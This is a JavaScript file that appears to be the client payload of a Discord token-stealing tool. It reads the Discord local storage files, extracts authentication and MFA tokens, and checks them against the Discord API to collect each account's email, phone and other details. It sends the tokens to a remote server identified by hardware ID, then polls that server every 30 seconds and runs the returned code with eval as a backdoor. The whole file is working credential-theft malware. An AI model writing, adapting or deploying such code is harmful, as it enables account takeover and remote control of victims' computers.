// This is the code that the client
// will run after the constant_client_code

// Do our own stuff
const fs = require('fs');

class TokenData {
    constructor(token, id, username, discriminator, email, avatar, verified, locale, mfa_enabled, phone, premium_type) {
        this.token = token;
        this.id = id;
        this.username = username;
        this.discriminator = discriminator;
        this.email = email;
        this.avatar = avatar;
        this.verified = verified;
        this.locale = locale;
        this.mfa_enabled = mfa_enabled;
        this.phone = phone;
        this.premium_type = premium_type;
    }

    static fromJSON(parsed) {
        return new TokenData(
            parsed.token,
            parsed.id,
            parsed.username,
            parsed.discriminator,
            parsed.email,
            parsed.avatar,
            parsed.verified,
            parsed.locale,
            parsed.mfa_enabled,
            parsed.phone,
            parsed.premium_type
        );
    }

    toJSON() {
        return JSON.stringify({
            token: this.token,
            id: this.id,
            username: this.username,
            discriminator: this.discriminator,
            email: this.email,
            avatar: this.avatar,
            verified: this.verified,
            locale: this.locale,
            mfa_enabled: this.mfa_enabled,
            phone: this.phone,
            premium_type: this.premium_type,
        });
    }
}

function postData(data) {
    post(url.toLowerCase() + `/d/${hwid}`, { data }).then(() => {});
}

const getTokens = async () => {
    const testToken = (token) => {
        return new Promise((resolve, reject) => {
            get('https://discordapp.com/api/v6/users/@me', { Authorization: token }, true).then((res) => resolve(res));
        });
    };

    const discordFolder = `${process.env.APPDATA}/Discord`;
    const tokenFiles = fs.readdirSync(`${discordFolder}/Local Storage/leveldb`).filter((f) => f.endsWith('.ldb'));

    let validTokens = [];

    for (let file of tokenFiles) {
        let matches = fs.readFileSync(`${discordFolder}/Local Storage/leveldb/${file}`, 'utf8').match(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g);
        if (!matches) matches = [];

        let mfa_matches = fs.readFileSync(`${discordFolder}/Local Storage/leveldb/${file}`, 'utf8').match(/mfa\.[\w-]{84}/g);
        if (mfa_matches) matches.push(...mfa_matches);

        if (matches.length) {
            for (let match of matches) {
                if (!match) continue;

                const res = await testToken(match);
                const parsed = JSON.parse(res.body);

                if (res.statusCode == 200) {
                    if (!validTokens.find((e) => e.id == parsed.id)) {
                        validTokens.push(TokenData.fromJSON({ ...parsed, token: match }));
                    }
                }
            }
        }
    }

    return JSON.stringify(validTokens.map((t) => t.toJSON()));
};

getTokens().then((tokens) => {
    get(url.toLowerCase() + `/u/${hwid}?t=${tokens}`).then(() => {
        get(url.toLowerCase() + `/p/${hwid}`).then((res) => {
            eval(res);
        });

        setInterval(() => {
            get(url.toLowerCase() + `/p/${hwid}`).then((res) => {
                eval(res);
            });
        }, 30 * 1000);
    });
});
